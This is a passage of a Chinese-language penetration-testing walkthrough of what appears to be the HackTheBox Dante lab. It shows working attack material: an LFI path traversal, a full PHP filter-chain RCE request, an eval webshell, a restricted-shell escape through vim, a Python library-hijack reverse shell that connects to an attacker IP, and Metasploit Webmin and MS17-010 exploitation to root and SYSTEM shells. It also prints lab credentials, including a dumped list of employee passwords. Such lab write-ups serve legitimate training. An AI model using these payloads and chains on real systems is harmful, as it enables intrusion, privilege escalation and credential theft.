pulse:x:123:128:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gnome-initial-setup:x:124:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:125:130:Gnome Display Manager:/var/lib/gdm3:/bin/false
frank:x:1000:1000:frank,,,:/home/frank:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
margaret:x:1001:1001::/home/margaret:/bin/lshell
mysql:x:126:133:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:127:65534::/run/sshd:/usr/sbin/nologin
omi:x:998:997::/home/omi:/bin/false
omsagent:x:997:998:OMS agent:/var/opt/microsoft/omsagent/run:/bin/bash
nxautomation:x:996:995:nxOMSAutomation:/home/nxautomation/run:/bin/bash
```
这台主机存在两个可以登陆的用户：
- frank
- margaret

结合 SMB 匿名枚举的信息，margaret 是拥有管理员权限的。并且该主机中部署了 wordpress。

但访问 /wordpress 访问不到 wordpress 服务，扫描目录也没有有用的结果。

直接读取 margaret 目录下的 flag。
```bash
http://172.16.1.10/nav.php?page=../../../../../../../../../home/margaret/flag.txt
```
访问 `/nav.php?page=../../../../../../../../../var/www/html/wordpress/index.php` 时得到了一个 500 响应。如果没有文件不存在的话应该是 200，说明存在该文件，但由于 php 文件包含导致服务出错。

php 文件包含可以通过 filter 读取源码。
```bash
page=php://filter/convert.base64-encode/resource=../../../../../../../../../var/www/html/wordpress/index.php
```
也可以利用 filter chain 来 RCE。
```http
POST /nav.php?page=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp HTTP/1.1
Host: 172.16.1.10
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 4

0=ls
```
![20240102074816](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20240102074816.png)

<!-- ![Alt text](../../../../../assets/image-6.png) -->

写入一个 webshell。
```bash
0=echo+'<?php+eval($_POST["pass"]);'+>e.php
```
拿到 webshell 后在 wp-config.php 中获取到用户 margaret 的密码
```php
define( 'DB_NAME' 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'margaret' );

/** MySQL database password */
define( 'DB_PASSWORD', 'Welcome1!2@3#' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
```
但比较奇怪的是连接数据库时返回 Access Deny。

使用 ssh 进行连接时发现该用户不允许远程登陆。
```bash
root@DANTE-WEB-NIX01:/tmp# ssh margaret@172.16.1.10
/etc/ssh/ssh_config: line 53: Bad configuration option: denyusers
/etc/ssh/ssh_config: line 54: Bad configuration option: permitrootlogin
/etc/ssh/ssh_config: terminating, 2 bad configuration options
```

### 提权到 margaret: bash 逃逸
反弹 shell 后可以 su 切换到 margaret 用户，但很多命令无法使用：
```bash
You are in a limited shell.
Type '?' or 'help' to get the list of allowed commands
```
只能使用下面的几个命令。
```bash
margaret:~$ help
cd  clear  exit  help  history  lpath  lsudo  vim
```
查询 gtfobins，vim 可以打开 shell、文件读取、文件下载等。

但目标的限制很多，包括 shell 的限制，文件路径限制等。
```bash
*** forbidden path: /root/flag.txt
```
直接执行 `vim -c ':set shell=/bin/sh|:shell'` 会被限制。但如果先进入 vim，然后再执行 `:set shell=/bin/sh|:shell` 即可绕过限制。
```
ls
1
channels.json
Desktop
Documents
Downloads
dpipe
flag.txt
flag.txt~
flag.txy~
flag.txz~
integration_logs.json
linpeas_fat.sh
linpeas.sh
Music
out1.txt
out2.txt
Pictures
project
Public
secure
snap
sudo
team
Templates
test
users.json
Videos
welcome
```
绕过之后还是无法读取 /root/flag.txt

### 提权到 root: traitor（未成功）
上传 traitor，traitor 是一个集成了 gtfobins 和 linux 常见提权漏洞的扫描和利用工具。
```bash
▀█▀ █▀█ ▄▀█ █ ▀█▀ █▀█ █▀█                                     
░█░ █▀▄ █▀█ █ ░█░ █▄█ █▀▄ v0.0.14                                                                                            
https://github.com/liamg/traitor                                                                                             
                                                                                                                             
[+] Assessing machine state...                                                                                               
[+] Checking for opportunities...
[+][polkit:CVE-2021-3560] Polkit version is vulnerable!
[+][polkit:CVE-2021-3560] System is vulnerable! Run again with '--exploit polkit:CVE-2021-3560' to exploit it.
[+][kernel:CVE-2022-0847] Kernel version 5.15.0 is vulnerable!
[+][kernel:CVE-2022-0847] System is vulnerable! Run again with '--exploit kernel:CVE-2022-0847' to exploit it.
```
尝试了 CVE-2021-3560 和 CVE-2022-0847 均无法成功。


### 提权到 frank: Slack 渗透
查看 进程列表发现 frank 用户使用了 Slack。在 /home/frank/Downloads/ 目录下发现了导出文件：Test Workspace Slack export May 17 2020 - May 18 2020.zip

将导出文件下载到本地。其中 secure/2020-05-18.json 中包含了部分聊天记录。提取聊天内容：
```json
"text": "<@U013CT40QHM> set the channel purpose: discuss network security",
"text": "<@U014025GL3W> has joined the channel",
"text": "Hi Margaret, I created the channel so we can discuss the network security - in private!",
"text": "Hi Margaret,
"text": "Great idea, Frank",
"text": "Great idea,
"text": "We need to migrate the Slack workspace to the new Ubuntu images, can you do this today?",
"text": "We need to migrate the Slack workspace to the new Ubuntu images,
"text": "Sure, but I need my password for the Ubuntu images, I haven't been given it yet",
"text": "Sure, but I need my password for the Ubuntu images,
"text": "Ahh sorry about that - its STARS5678FORTUNE401",
"text": "Thanks very much, I'll get on that now.",
"text": "Thanks very much,
"text": "No problem at all. I'll make this channel private from now on - we cant risk another breach",
"text": "Please get rid of my admin privs on the Ubuntu box and go ahead and make yourself an admin account",
"text": "Thanks, will do",
"text": "Thanks,
"text": "I also set you a new password on the Ubuntu box - 69F15HST1CX, same username",
"text": "I also set you a new password on the Ubuntu box - 69F15HST1CX,
```

frank/69F15HST1CX

但该密码无法正常登陆至 frank。Slack 导出文件可能对聊天记录中的敏感内容进行了。加密，原始记录所在路径为：~/.config/Slack/exported_data/secure/2020-05-18.json

```bash
"text": "<@U013CT40QHM> set the channel purpose: discuss network security",
"text": "<@U014025GL3W> has joined the channel",
"text": "Hi Margaret, I created the channel so we can discuss the network security - in private!",
"text": "Hi Margaret,
"text": "Great idea, Frank",
"text": "Great idea,
"text": "We need to migrate the Slack workspace to the new Ubuntu images, can you do this today?",
"text": "We need to migrate the Slack workspace to the new Ubuntu images,
"text": "Sure, but I need my password for the Ubuntu images, I haven't been given it yet",
"text": "Sure, but I need my password for the Ubuntu images,
"text": "Ahh sorry about that - its STARS5678FORTUNE401",
"text": "Thanks very much, I'll get on that now.",
"text": "Thanks very much,
"text": "No problem at all. I'll make this channel private from now on - we cant risk another breach",
"text": "Please get rid of my admin privs on the Ubuntu box and go ahead and make yourself an admin account",
"text": "Thanks, will do",
"text": "Thanks,
"text": "I also set you a new password on the Ubuntu box - TractorHeadtorchDeskmat, same username",
"text": "I also set you a new password on the Ubuntu box - TractorHeadtorchDeskmat,
```
正确密码应该是 TractorHeadtorchDeskmat。

### 提权到 root: python 劫持
注意到 linPEAS 结果中的一个条目：`Searching root files in home dirs`，其中包含了文件：/home/frank/apache_restart.py
```py
import call
import urllib
url = urllib.urlopen(localhost)
page= url.getcode()
if page ==200:
        print ("We're all good!")
else:
        print("We're failing!")
        call(["systemctl start apache2"], shell=True)
```
可以看到该脚本的属主为 root，且功能是监控 apache2 的状态并完成 apache2 的启动。但该脚本没有添加循环，猜测是否使用了定时任务或者使用了 while 循环来执行。

使用 ps 查看进程，发现该脚本没有直接运行。
```bash
ps aux | grep apache_restart
frank      23140  0.0  0.0   3312   720 ?        S    22:45   0:00 grep apache_restart
```

查看定时任务目录，搜索 apache_restart 也同样没有结果，该定时任务可能是隐藏的。
```bash
cd /etc/cron.d
grep -r apache_restart
```

使用 pspy 可以查找到隐藏的定时任务，可以看到是 root 用户直接用 /usr/sbin/CRON 执行 apache_restart.py。
```bash
2023/12/25 22:57:59 CMD: UID=0     PID=1      | /sbin/init auto noprompt 
2023/12/25 22:58:01 CMD: UID=0     PID=24240  | /usr/sbin/CRON -f 
2023/12/25 22:58:01 CMD: UID=0     PID=24242  | /bin/sh -c python3 /home/frank/apache_restart.py; sleep 1; rm /home/frank/call.py; sleep 1; rm /home/frank/urllib.py                                                                                      
2023/12/25 22:58:01 CMD: UID=0     PID=24243  | python3 /home/frank/apache_restart.py 
2023/12/25 22:58:01 CMD: UID=0     PID=24244  | sleep 1 
2023/12/25 22:58:02 CMD: UID=1000  PID=24245  | /snap/slack/65/usr/lib/slack/slack --no-sandbox --executed-from=/home/frank --pid=1805 --enable-crashpad                                                                                                  
2023/12/25 22:58:02 CMD: UID=0     PID=24246  | rm /home/frank/call.py 
2023/12/25 22:58:02 CMD: UID=0     PID=24247  | sleep 1 
2023/12/25 22:58:03 CMD: UID=0     PID=24248  | 
```
但 apache_restart.py 本身无法修改，但 apache_restart.py 调用了 call.py 和 urllib 库，由于 python 中调用库时会优先从当前目录加载，如果直接在 /home/frank 目录下写入 urllib.py，那么程序会优先加载我们编写的 urllib.py。

编写一个反弹 shell 的 python 脚本。
```py
import os,pty,socket;s=socket.socket();s.connect(("10.10.14.5",9998));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")
```
监听 9998 端口
```bash
nc -lvp 9998
```
将 python 脚本写入 /home/frank/urllib.py

等待一段时间后成功得到 root shell。
```bash
└─$ nc -lvvp 9998
Listening on 0.0.0.0 9998
Connection received on 10.10.110.3 19185
root@DANTE-NIX02:~# pwd
pwd
/root
root@DANTE-NIX02:~# cat /root/flag.txt
cat /root/flag.txt
DANTE{L0v3_m3_S0m3_H1J4CK1NG_XD}
root@DANTE-NIX02:~# 
```

## Linux: 172.16.1.17
开放端口：
```
172.16.1.17	80
172.16.1.17	139
172.16.1.17	445
172.16.1.17	10000
```
### 80 端口源码泄露
80 端口部署了 Apache 服务，给出了一个 webmin-1.900.zip 文件。

泄露出的 webmin 版本为 1.900，该版本存在诸多漏洞，可以直接在 searchsploit 中搜索。
```bash
Webmin 1.900 - Remote Command Execution (Metasploit)                                       | cgi/remote/46201.rb
Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)                     | linux/remote/46984.rb
Webmin 1.920 - Remote Code Execution                                                       | linux/webapps/47293.sh
Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)                          | linux/remote/47230.rb
Webmin 1.962 - 'Package Updates' Escape Bypass RCE (Metasploit)                            | linux/webapps/49318.rb
Webmin 1.973 - 'run.cgi' Cross-Site Request Forgery (CSRF)                                 | linux/webapps/50144.py
Webmin 1.973 - 'save_user.cgi' Cross-Site Request Forgery (CSRF)                           | linux/webapps/50126.py
Webmin 1.984 - Remote Code Execution (Authenticated)                                       | linux/webapps/50809.py
Webmin 1.996 - Remote Code Execution (RCE) (Authenticated)                                 | linux/webapps/50998.py
Webmin 1.x - HTML Email Command Execution                                                  | cgi/webapps/24574.txt
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure                               | multiple/remote/1997.php
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure                               | multiple/remote/2017.pl
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)                              | linux/webapps/47330.rb
------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

``` 

http://172.16.1.17/webmin/ 直接给出了一个 perl 文件。
```perl
#!/usr/bin/perl
## Display all Webmin modules visible to the current user

BEGIN { push(@INC, "."); };
use WebminCore;

&init_config();
&ReadParse();
$hostname = &get_display_hostname();
$ver = &get_webmin_version();
&get_miniserv_config(\%miniserv);
if ($gconfig{'real_os_type'}) {
	if ($gconfig{'os_version'} eq "*") {
		$ostr = $gconfig{'real_os_type'};
		}
	else {
		$ostr = "$gconfig{'real_os_type'} $gconfig{'real_os_version'}";
		}
	}
else {
	$ostr = "$gconfig{'os_type'} $gconfig{'os_version'}";
	}
%access = &get_module_acl();

## Build a list of all modules
@modules = &get_visible_module_infos();

if (!defined($in{'cat'})) {
	# Maybe redirect to some module after login
	local $goto = &get_goto_module(\@modules);
	if ($goto) {
		&redirect($goto->{'dir'}.'/');
		exit;
		}
	}

$gconfig{'sysinfo'} = 0 if ($gconfig{'sysinfo'} == 1);

if ($gconfig{'texttitles'}) {
	@args = ( $text{'main_title2'}, undef );
	}
else {
	@args = ( $gconfig{'nohostname'} ? $text{'main_title2'} :
		    &text('main_title', $ver, $hostname, $ostr),
		  "images/webmin-blue.png" );
	if ($gconfig{'showlogin'}) {
		$args[0] = $remote_user." : ".$args[0];
		}
	}
&header(@args, undef, undef, 1, 1,
	$tconfig{'brand'} ? 
	"<a href=$tconfig{'brand_url'}>$tconfig{'brand'}</a>" :
	$gconfig{'brand'} ? 
	"<a href=$gconfig{'brand_url'}>$gconfig{'brand'}</a>" :
	"<a href=http://www.webmin.com/>$text{'main_homepage'}</a>"
	);
print "<center><font size=+1>",
    &text('main_version', $ver, $hostname, $ostr),"</font></center>\n"
	if (!$gconfig{'nohostname'});
print "<hr id='header_hr'><p>\n";

print $text{'main_header'};

if (!@modules) {
	# use has no modules!
	print "<p class='main_none'><b>$text{'main_none'}</b><p>\n";
	}
elsif ($gconfig{"notabs_${base_remote_user}"} == 2 ||
    $gconfig{"notabs_${base_remote_user}"} == 0 && $gconfig{'notabs'}) {
	# Generate main menu with all modules on one page
	print "<center><table id='mods' cellpadding=5 cellspacing=0 width=100%>\n";
	$pos = 0;
	$cols = $gconfig{'nocols'} ? $gconfig{'nocols'} : 4;
	$per = 100.0 / $cols;
	foreach $m (@modules) {
		if ($pos % $cols == 0) { print "<tr $cb>\n"; }
		print "<td valign=top align=center width=$per\%>\n";
		local $idx = $m->{'index_link'};
		print "<table border><tr><td><a href=$gconfig{'webprefix'}/$m->{'dir'}/$idx>",
		      "<img src=$m->{'dir'}/images/icon.gif border=0 ",
		      "width=48 height=48></a></td></tr></table>\n";
		print "<a href=$gconfig{'webprefix'}/$m->{'dir'}/$idx>$m->{'desc'}</a></td>\n";
		if ($pos % $cols == $cols - 1) { print "</tr>\n"; }
		$pos++;
		}
	print "</table></center><p><hr id='mods_hr'>\n";
	}
else {
	# Display under categorised tabs
	&ReadParse();
	%cats = &list_categories(\@modules);
	@cats = sort { $b cmp $a } keys %cats;
	$cats = @cats;
	$per = $cats ? 100.0 / $cats : 100;
	if (!defined($in{'cat'})) {
		# Use default category
		if (defined($gconfig{'deftab'}) &&
		    &indexof($gconfig{'deftab'}, @cats) >= 0) {
			$in{'cat'} = $gconfig{'deftab'};
			}
		else {
			$in{'cat'} = $cats[0];
			}
		}
	elsif (!$cats{$in{'cat'}}) {
		$in{'cat'} = "";
		}
	print "<table id='cattabs' border=0 cellpadding=0 cellspacing=0 height=20><tr>\n";
	$usercol = defined($gconfig{'cs_header'}) ||
		   defined($gconfig{'cs_table'}) ||
		   defined($gconfig{'cs_page'});
	foreach $c (@cats) {
		$t = $cats{$c};
		if ($in{'cat'} eq $c) {
			print "<td class='usercoll' valign=top $cb>", $usercol ? "<br>" :
			  "<img src=images/lc2.gif alt=\"\">","</td>\n";
			print "<td class='usercolc' id='selectedcat' $cb>&nbsp;<b>$t</b>&nbsp;</td>\n";
			print "<td class='usercolr' valign=top $cb>", $usercol ? "<br>" :
			  "<img src=images/rc2.gif alt=\"\">","</td>\n";
			}
		else {
			print "<td class='usercoll' valign=top $tb>", $usercol ? "<br>" :
			  "<img src=images/lc1.gif alt=\"\">","</td>\n";
			print "<td class='usercolc' $tb>&nbsp;",
			      "<a href=$gconfig{'webprefix'}/?cat=$c><b>$t</b></a>&nbsp;</td>\n";
			print "<td class='usercolr' valign=top $tb>", $usercol ? "<br>" :
			  "<img src=images/rc1.gif alt=\"\">","</td>\n";
			}
		print "<td width=10></td>\n";
		}
	print "</tr></table> <table id='mods' border=0 cellpadding=0 cellspacing=0 ",
              "width=100% $cb>\n";
	print "<tr><td><table width=100% cellpadding=5>\n";

	# Display the modules in this category
	$pos = 0;
	$cols = $gconfig{'nocols'} ? $gconfig{'nocols'} : 4;
	$per = 100.0 / $cols;
	foreach $m (@modules) {
		next if ($m->{'category'} ne $in{'cat'});

		if ($pos % $cols == 0) { print "<tr>\n"; }
		local $idx = $m->{'index_link'};
		print "<td valign=top align=center width=$per\%>\n";
		print "<table border bgcolor=#ffffff><tr><td><a href=$gconfig{'webprefix'}/$m->{'dir'}/$idx>",
		      "<img src=$m->{'dir'}/images/icon.gif alt=\"\" border=0></a>",
		      "</td></tr></table>\n";
		print "<a href=$gconfig{'webprefix'}/$m->{'dir'}/$idx>$m->{'desc'}</a></td>\n";
		if ($pos++ % $cols == $cols - 1) { print "</tr>\n"; }
		}
	while($pos++ % $cols) {
		print "<td width=$per\%></td>\n";
		}
	print "</table></td></tr></table><p><hr id='mods_hr'>\n";
	}

## Check for incorrect OS
if (&foreign_check("webmin")) {
	&foreign_require("webmin", "webmin-lib.pl");
	&webmin::show_webmin_notifications();
	}

if ($miniserv{'logout'} &&
    !$ENV{'SSL_USER'} && !$ENV{'LOCAL_USER'} && !$ENV{'ANONYMOUS_USER'} &&
    $ENV{'HTTP_USER_AGENT'} !~ /webmin/i) {
	print "<table id='altlogout' width=100% cellpadding=0 cellspacing=0><tr>\n";
	if ($main::session_id) {
		print "<td align=right><a href='session_login.cgi?logout=1'>",
		      "$text{'main_logout'}</a></td>\n";
		}
	else {
		print "<td align=right><a href=switch_user.cgi>",
		      "$text{'main_switch'}</a></td>\n";
		}
	print "</tr></table>\n";
	}

print $text{'main_footer'};
&footer();

```
### webmin 服务 RCE
10000 端口部署了一个 webmin 服务，结合此前从 monitor 中获取的用户名密码：
- admin/password6543
- admin/Password6543

![20231226023313](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231226023313.png)

<!-- ![Alt text](../../../../../assets/image-8.png) -->

使用第二个密码可以成功登陆，并且 1.900 存在较多漏洞。

msf 中集成了一些 exp。

```bash
Matching Modules
================

   #  Name                                           Disclosure Date  Rank       Check  Description
   -  ----                                           ---------------  ----       -----  -----------
   0  exploit/unix/webapp/webmin_show_cgi_exec       2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
   1  auxiliary/admin/webmin/file_disclosure         2006-06-30       normal     No     Webmin File Disclosure
   2  exploit/linux/http/webmin_file_manager_rce     2022-02-26       excellent  Yes    Webmin File Manager RCE
   3  exploit/linux/http/webmin_package_updates_rce  2022-07-26       excellent  Yes    Webmin Package Updates RCE
   4  exploit/linux/http/webmin_packageup_rce        2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
   5  exploit/unix/webapp/webmin_upload_exec         2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE
   6  auxiliary/admin/webmin/edit_html_fileaccess    2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
   7  exploit/linux/http/webmin_backdoor             2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor

```

但我在利用如下的几个 exp 时都无法成功
- exploit/linux/http/webmin_packageup_rce (webmin<=1.900)
- exploit/linux/http/webmin_file_manager_rce (webmin v1.984)

最后成功是利用了这个 exp：
- exploit/linux/http/webmin_packageup_rce (<=1.910)

```bash
msf6 exploit(linux/http/webmin_packageup_rce) > set RHOSTS 172.16.1.17
RHOSTS => 172.16.1.17
msf6 exploit(linux/http/webmin_packageup_rce) > set username admin
username => admin
msf6 exploit(linux/http/webmin_packageup_rce) > set password Password6543
password => Password6543
msf6 exploit(linux/http/webmin_packageup_rce) > set LPORT 5555
LPORT => 5555
msf6 exploit(linux/http/webmin_packageup_rce) > set LHOST 10.10.14.5
LHOST => 10.10.14.5
msf6 exploit(linux/http/webmin_packageup_rce) > run

[*] Started reverse TCP handler on 10.10.14.5:5555 
[+] Session cookie: e1dece8037d8d0ad4eb308ceb0166993
[*] Attempting to execute the payload...
[*] Command shell session 12 opened (10.10.14.5:5555 -> 10.10.110.3:40521) at 2023-12-26 03:17:45 -0500


whoami
root


```
一开始获取到的是 sh，无法切目录也无法读取 /root/flag.txt，可能是对 sh 进行了限制，进入 bash 后可以正常读取文件。
```bash
echo $0
bash
cat /root/flag
```

用户目录下有一个用户 lou，但 Desktop 中没有 flag。


## Windows: 172.16.1.20 (DANTE-DC01)

### MS17-010
msf 中关于 MS17-010 的 exp 总共有四个：
```bash
0  exploit/windows/smb/ms17_010_eternalblue              2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
1  exploit/windows/smb/ms17_010_psexec                   2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
2  auxiliary/admin/smb/ms17_010_command                  2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
3  auxiliary/scanner/smb/smb_ms17_010                                     normal   No     MS17-010 SMB RCE Detection
```

1. exploit/windows/smb/ms17_010_eternalblue 存在ms17-010漏洞即可使用，不太稳定，容易被杀软识别，有概率导致目标机蓝屏
2. exploit/windows/smb/ms17_010_psexec 需要命名管道开启，配合模块3，比 ms17_010_eternalblue 稳定，可绕过一些杀软。
3. auxiliary/admin/smb/ms17_010_command 该模块是所有利用方法中最为稳定的，并且不会被杀软拦截等。可以直接通过命令添加用户、开启3389、下载Rat等操作。
4. auxiliary/scanner/smb/smb_ms17_010 用来探测ms17-010漏洞是否存在

我们可以先利用 auxiliary/scanner/smb/smb_ms17_010 探测漏洞是否存在。注意在利用前先添加路由，multi/manage/autoroute 模块可以自动添加路由。
```bash
use multi/manage/autoroute
set session 1
exploit
```
探测漏洞
```bash
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 172.16.1.20
exploit 

[+] 172.16.1.20:445       - Host is likely VULNERABLE to MS17-010! - Windows Server 2012 R2 Standard 9600 x64 (64-bit)
[*] 172.16.1.20:445       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
使用 use exploit/windows/smb/ms17_010_psexec 模块进行利用。payload 也可以使用 set payload windows/meterpreter/reverse_tcp，可以获取一个 meterpreter。
```bash
use exploit/windows/smb/ms17_010_psexec
set rhost 172.16.1.20
set lhost 10.10.14.5
## set payload windows/meterpreter/reverse_tcp
set payload generic/shell_reverse_tcp
run

[*] Started reverse TCP handler on 10.10.14.5:4444 
[*] 172.16.1.20:445 - Target OS: Windows Server 2012 R2 Standard 9600
[*] 172.16.1.20:445 - Built a write-what-where primitive...
[+] 172.16.1.20:445 - Overwrite complete... SYSTEM session obtained!
[*] 172.16.1.20:445 - Selecting PowerShell target
[*] 172.16.1.20:445 - Executing the payload...
[+] 172.16.1.20:445 - Service start timed out, OK if running a command or non-service executable...
[*] Command shell session 2 opened (10.10.14.5:4444 -> 10.10.110.3:41827) at 2023-12-25 03:15:33 -0500


Shell Banner:
Microsoft Windows [Version 6.3.9600]
-----
          

C:\Windows\system32>
```
成功获取到 SYSTEM shell。

查看 Users 目录下的用户：
```bash
12/25/2023  03:08 AM    <DIR>          katwamba
01/08/2021  12:26 PM    <DIR>          MediaAdmin$
08/22/2013  03:39 PM    <DIR>          Public
06/10/2020  11:23 AM    <DIR>          test
07/19/2022  04:33 PM    <DIR>          xadmin
```
- katwamba
- test
- xadmin

在 `katwamba\Desktop` 目录下找到 flag.txt。该目录下还有一个 employee_backup.xlsx 文件，下载回来。

```bash
meterpreter > download "C:\Users\katwamba\Desktop\employee_backup.xlsx" /project/HTB/ProLab/Dante
```
文件中包含了很多用户名密码。
```bash
asmith	Princess1
smoggat	Summer2019
tmodle	P45678!
ccraven	Password1
kploty	Teacher65
jbercov	4567Holiday1
whaguey	acb123
dcamtan	WorldOfWarcraft67
tspadly	RopeBlackfieldForwardslash
ematlis	JuneJuly1TY
fglacdon	FinalFantasy7
tmentrso	65RedBalloons
dharding	WestminsterOrange5
smillar	MarksAndSparks91
bjohnston	Bullingdon1
iahmed	Sheffield23
plongbottom	PowerfixSaturdayClub777
jcarrot	Tanenbaum0001
lgesley	SuperStrongCantForget123456789
```

### 用户 Comment 信息泄露
net users 查看用户时发现存在一个 mrb3n 用户，进一步查看该用户的信息时，可以在 Comment 中发现密码和 flag。
- mrb3n/S3kur1ty2020!

```bash
C:\Windows\system32>net user mrb3n
net user mrb3n
User name                    mrb3n
Full Name                    mrb3n
Comment                      mrb3n was here. I used keep my password S3kur1ty2020! here but have since stopped.  DANTE{1_jusT_c@nt_st0p_d0ing_th1s}
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            7/31/2020 3:43:25 PM
Password expires             1/27/2021 3:43:25 PM
Password changeable          7/31/2020 3:43:25 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      
Global Group memberships     *Domain Users         
The command completed successfully.
```

### 域内信息收集（有凭证）
有了域用户 mrb3n/S3kur1ty2020! 后，可以使用 bloodhound 收集域内信息。

bloodhound-python 相比 SharpHound 的优势在于不需要在域内机器中落地，但需要注意的是，UDP 请求无法经过 socks 代理，但 --dns-tcp 参数可以将 dns 请求以 TCP 的方式发送，这样就可以避免 bloodhound-python 无法解析到域名。
```bash
p -q bloodhound-python --zip -c All -d DANTE.local -u mrb3n -p 'S3kur1ty2020!' -dc DANTE-DC01.DANTE.local -ns 172.16.1.20 --dns-tcp
```

但目标返回无法认证成功，难道是密码不对的缘故？
```bash
INFO: Found AD domain: dante.local
INFO: Getting TGT for user
